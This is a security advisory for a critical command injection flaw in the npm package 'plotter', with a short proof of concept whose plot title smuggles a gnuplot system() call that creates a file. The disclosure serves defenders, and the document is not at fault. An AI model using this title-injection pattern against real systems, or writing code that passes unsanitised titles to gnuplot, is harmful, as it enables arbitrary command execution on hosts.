# [C] Command Injection in plotter

## Summary
Severity: Critical
Advisory: GHSA-65xx-c85x-wg76
CWE: CWE-77
Ecosystem: npm
Published: 2020-09-04
Source: https://github.com/advisories/GHSA-65xx-c85x-wg76
Type: github-advisory

## Affected
- npm: `plotter` — affected >=0.0.0

## Details
All versions of `plotter` are vulnerable to Command Injection. The package fails to sanitize plot titles, which may allow attackers to execute arbitrary code in the system if the title value is supplied by a user. The following proof-of-concept creates a `testing` file in the current directory:

```
var plot = require('plotter').plot;

const title = 'Example "\nset title system("touch testing")#';

plot({
data: [ 3, 1, 2, 3, 4 ],
filename: 'output.pdf',
style: 'linespoints',
title: title,
logscale: true,
xlabel: 'time',
ylabel: 'length of string',
format: 'pdf'
});

```


## Recommendation

No fix is currently available. Consider using an alternative package until a fix is made available.

## References
- https://www.npmjs.com/advisories/1441
